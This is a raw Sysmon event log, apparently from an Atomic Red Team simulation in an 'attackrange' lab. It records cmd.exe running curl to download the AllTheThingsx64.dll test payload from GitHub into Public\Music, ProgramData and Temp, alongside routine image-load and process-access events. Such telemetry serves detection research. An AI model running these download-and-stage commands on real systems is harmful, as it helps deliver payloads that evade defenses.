<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.387546400Z'/><EventRecordID>34354207</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.386</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\advapi32.dll</Data><Data Name='FileVersion'>10.0.14393.4467 (rs1_release.210604-1844)</Data><Data Name='Description'>Advanced Windows 32 Base API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>advapi32.dll</Data><Data Name='Hashes'>MD5=A8CDCAC5C32D14ED8AADDF5489FC5D55,SHA256=140F07A8F6780DAFE20CC4FBE86C9332FB2F0C26ED8F49914BD05265C63EF6F1</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.386793100Z'/><EventRecordID>34354206</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.386</Data><Data Name='SourceProcessGUID'>{8B6011A9-C6FA-616E-9C35-01000000F101}</Data><Data Name='SourceProcessId'>4136</Data><Data Name='SourceThreadId'>5516</Data><Data Name='SourceImage'>C:\Windows\system32\conhost.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='TargetProcessId'>2544</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\SYSTEM32\ConhostV2.dll+5ca7|C:\Windows\SYSTEM32\ConhostV2.dll+774b|C:\Windows\SYSTEM32\ConhostV2.dll+a8ef|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.386247500Z'/><EventRecordID>34354205</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.385</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\KernelBase.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>Windows NT BASE API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Kernelbase.dll</Data><Data Name='Hashes'>MD5=0F627827D9CFFA8E0BCF30F013FB7209,SHA256=EA47C3E471801ACA92EE449C66CF785EA670ADE92A5A2D5CDB81C93DD72ABEF0</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.385961600Z'/><EventRecordID>34354204</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.385</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\kernel32.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>Windows NT BASE API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>kernel32</Data><Data Name='Hashes'>MD5=A5AD62615D2361BFAEC6C047B199184C,SHA256=B43F3DFDAF7BAA7A2B97015631F96CE429C50348D380080CFC29C36F959D7886</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.385522400Z'/><EventRecordID>34354203</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.384</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\ntdll.dll</Data><Data Name='FileVersion'>10.0.14393.4530 (rs1_release.210705-0736)</Data><Data Name='Description'>NT Layer DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>ntdll.dll</Data><Data Name='Hashes'>MD5=36B87C41EE39F3051D116F735EBEF866,SHA256=9C45BAE6D7E27B3AE04BBF88B96686C04ED6A43695558E82B687013BA0383F8A</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.385299200Z'/><EventRecordID>34354202</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.384</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\Curl.exe</Data><Data Name='FileVersion'>7.79.1</Data><Data Name='Description'>The curl executable</Data><Data Name='Product'>The curl executable</Data><Data Name='Company'>curl, https://curl.se/</Data><Data Name='OriginalFileName'>curl.exe</Data><Data Name='Hashes'>MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528</Data><Data Name='Signed'>false</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>Unavailable</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>25</EventID><Version>5</Version><Level>4</Level><Task>25</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.384892500Z'/><EventRecordID>34354201</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.384</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='Type'>Image is replaced</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.384744200Z'/><EventRecordID>34354200</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.383</Data><Data Name='SourceProcessGUID'>{8B6011A9-888A-6164-7000-00000000F101}</Data><Data Name='SourceProcessId'>3448</Data><Data Name='SourceThreadId'>3736</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='TargetProcessId'>2544</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\system32\basesrv.DLL+2f47|C:\Windows\SYSTEM32\CSRSRV.dll+5645|C:\Windows\SYSTEM32\ntdll.dll+5178f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.384611500Z'/><EventRecordID>34354199</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.383</Data><Data Name='SourceProcessGUID'>{8B6011A9-F329-616E-043B-01000000F101}</Data><Data Name='SourceProcessId'>2936</Data><Data Name='SourceThreadId'>2664</Data><Data Name='SourceImage'>C:\Windows\system32\cmd.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='TargetProcessId'>2544</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a7404|C:\Windows\System32\KERNELBASE.dll+2b860|C:\Windows\System32\KERNELBASE.dll+6b246|C:\Windows\System32\KERNEL32.DLL+1c213|C:\Windows\system32\cmd.exe+f1e1|C:\Windows\system32\cmd.exe+11a37|C:\Windows\system32\cmd.exe+cb0d|C:\Windows\system32\cmd.exe+c295|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+f916|C:\Windows\system32\cmd.exe+1510d|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.384452600Z'/><EventRecordID>34354198</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.383</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-083B-01000000F101}</Data><Data Name='ProcessId'>2544</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='FileVersion'>7.79.1</Data><Data Name='Description'>The curl executable</Data><Data Name='Product'>The curl executable</Data><Data Name='Company'>curl, https://curl.se/</Data><Data Name='OriginalFileName'>curl.exe</Data><Data Name='CommandLine'>C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\ADMINI~1\AppData\Local\Temp\2\allthethingsx64.dll </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\2\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{8B6011A9-8897-6164-CBF3-050000000000}</Data><Data Name='LogonId'>0x5f3cb</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528</Data><Data Name='ParentProcessGuid'>{8B6011A9-F329-616E-043B-01000000F101}</Data><Data Name='ParentProcessId'>2936</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.381499800Z'/><EventRecordID>34354197</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.380</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.375926700Z'/><EventRecordID>34354196</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.375</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetFilename'>C:\ProgramData\allthethingsx64.dll</Data><Data Name='CreationUtcTime'>2021-10-19 16:32:42.374</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.352008800Z'/><EventRecordID>34354195</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.351</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\bcryptprimitives.dll</Data><Data Name='FileVersion'>10.0.14393.4583 (rs1_release.210730-1850)</Data><Data Name='Description'>Windows Cryptographic Primitives Library</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>bcryptprimitives.dll</Data><Data Name='Hashes'>MD5=8AAF6E1B14B9210052FFF90E25926D63,SHA256=F2120C8E63EA94F8618B31319A534731C16D8FDD58B0E1E70217D72A39D78353</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.351797500Z'/><EventRecordID>34354194</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.351</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\cryptbase.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Base cryptographic API DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>cryptbase.dll</Data><Data Name='Hashes'>MD5=51FCB0FDEFCB9A3E4A1DC8C8673BC63C,SHA256=63A0E1A76B7ABCF56E44B548568649FFB6B5609402746D48A4DC77CCED20F5FE</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.351413700Z'/><EventRecordID>34354193</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.349</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\rsaenh.dll</Data><Data Name='FileVersion'>10.0.14393.4467 (rs1_release.210604-1844)</Data><Data Name='Description'>Microsoft Enhanced Cryptographic Provider</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>rsaenh.dll</Data><Data Name='Hashes'>MD5=28140830C342F475A597B2D54C42DFFA,SHA256=99E23D0177C6DC59AD72DEEC46CFB995828EF567F001261BC65532B6DDEAD862</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.350039400Z'/><EventRecordID>34354192</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.349</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\cryptsp.dll</Data><Data Name='FileVersion'>10.0.14393.2969 (rs1_release.190503-1820)</Data><Data Name='Description'>Cryptographic Service Provider API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>cryptsp.dll</Data><Data Name='Hashes'>MD5=9500AE4C4B639FEAEED0CC6C39F45149,SHA256=C1055D4B9A854282336A5404CA0FCB1A2EBC3417600035338C9CDFC7B8D0778C</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.335671000Z'/><EventRecordID>34354191</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.334</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\bcrypt.dll</Data><Data Name='FileVersion'>10.0.14393.4583 (rs1_release.210730-1850)</Data><Data Name='Description'>Windows Cryptographic Primitives Library</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>bcrypt.dll</Data><Data Name='Hashes'>MD5=63231EA984BC614584102A96D4F35CB4,SHA256=13C5BD283C01B0D50D8D0D99E88FC67F9234FA14A6860AB2B6EE552199FF6A74</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.335347800Z'/><EventRecordID>34354190</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.334</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\FWPUCLNT.DLL</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>FWP/IPsec User-Mode API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>fwpuclnt.dll</Data><Data Name='Hashes'>MD5=A65FA613342B08E0F760D8B13B9C135A,SHA256=C64A1EC862188D2EE1202DB02BFBF4E2DD56780905E509012799EB57FC9A88ED</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.334298800Z'/><EventRecordID>34354189</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.333</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
